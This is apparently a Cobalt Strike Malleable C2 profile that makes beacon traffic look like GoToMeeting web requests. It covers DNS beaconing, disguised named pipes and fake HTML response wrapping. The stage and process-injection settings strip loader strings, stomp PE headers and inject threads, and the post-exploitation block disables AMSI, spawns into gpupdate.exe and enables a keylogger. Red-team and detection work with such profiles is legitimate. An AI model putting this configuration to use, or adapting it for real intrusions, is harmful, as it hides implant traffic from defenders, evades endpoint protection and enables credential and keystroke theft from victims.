#gotomeeting profile
#updated for 3.14
#this traffic mimics site traffic, NOT the actual ADP protocol used when the app loads and the meeting starts.
#xx0hcd

set sleeptime "37000";
set jitter    "25";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
set data_jitter "50";

set sample_name "gotomeeting.profile";

dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
    set headers "Server, Content-Type, Brightspot-Id, Cache-Control, X-Content-Type-Options, X-Powered-By, Vary, Connection";
    
	header "Connection" "close";
	header "Brightspot-Id" "00000459-72af-a783-feef2189";
	header "Cache-Control" "max-age=2";
	header "Server" "Apache-Coyote/1.1";
	header "X-Content-Type-Options" "nosniff";
	header "X-Powered-By" "Brightspot";
	header "Vary" "Accept-Encoding";
        set trust_x_forwarded_for "false";
        
        set block_useragents "curl*,lynx*,wget*";
    
}

#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";

http-get {

    set uri "/functionalStatus";
    
    client {

#set Host header to whatever
#       header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
	   
        metadata {
            base64url; 
	    parameter "_";

        }

    }

    server {
        
        output {

            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

http-post {
    
    set uri "/rest/2/meetings";
    set verb "GET";

    client {

#set Host header to whatever
#        header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en";
        header "Connection" "close";     
        
        output {
            base64url; 
	    parameter "includeMeetingsICoorganize";
        }


        id {
	    base64url;
	    parameter "includeCoorganizers";

        }
    }

    server {

        output {
            netbios;	    
	   
	    prepend "content=";
	    prepend "<meta name=\"google-site-verification\"\n";
	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
	    prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
	    prepend "<link rel=\"canonical\" href=\"https://www.gotomeeting.com/b\">\n";
	    prepend "<title>Online Meeting Software with HD Video Conferencing | GoToMeeting</title>\n";
	    prepend "        <meta charset=\"UTF-8\">\n";
	    prepend "    <head>\n";
	    prepend "<html lang=\"en\">\n";
	    prepend "<!DOCTYPE html>\n";

	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
	    append "<script type=\"text/javascript\">\n";
	    append "  var _kiq = _kiq || [];\n";
	    append "  (function(){\n";
	    append "    setTimeout(function(){\n";
	    append "    var d = document, f = d.getElementsByTagName('script')[0], s =\n";
	    append "d.createElement('script'); s.type = 'text/javascript';\n";
	    append "    s.async = true; s.src = '//s3.amazonaws.com/ki.js/66992/fWl.js';\n";
	    append "f.parentNode.insertBefore(s, f);\n";
	    append "    }, 1);\n";
	    append "})();\n";
	    append "</script>\n";
	    append "</body>\n";
	    append "</html>\n";
            print;
        }
    }
}

http-stager {

    set uri_x86 "/Meeting/32251817/";
    set uri_x64 "/Meeting/32251816/";

    client {
#        header "Host" "whatever.gotomeeting.com";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
    }

    server {
    
    }


}

###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
